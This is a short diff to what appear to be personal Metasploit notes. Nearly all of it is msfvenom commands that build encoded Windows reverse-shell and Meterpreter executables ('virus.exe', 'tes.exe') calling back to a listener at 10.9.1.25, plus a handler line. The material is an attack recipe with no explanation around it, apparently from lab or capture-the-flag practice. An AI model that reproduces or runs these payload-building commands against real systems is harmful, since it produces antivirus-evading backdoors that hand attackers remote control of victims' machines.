@@ -20,4 +20,6 @@ set LPORT 1337
 exploit -j
 
 Creating Windows Payload :
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.25 LPORT=1337 -e x86/shikata_ga_nai -f exe -o virus.exe
+- msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.25 LPORT=1338 -e x86/shikata_ga_nai -f exe -o virus.exe
+
+- msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.1.25 LPORT=1338 -f exe -o tes.exe
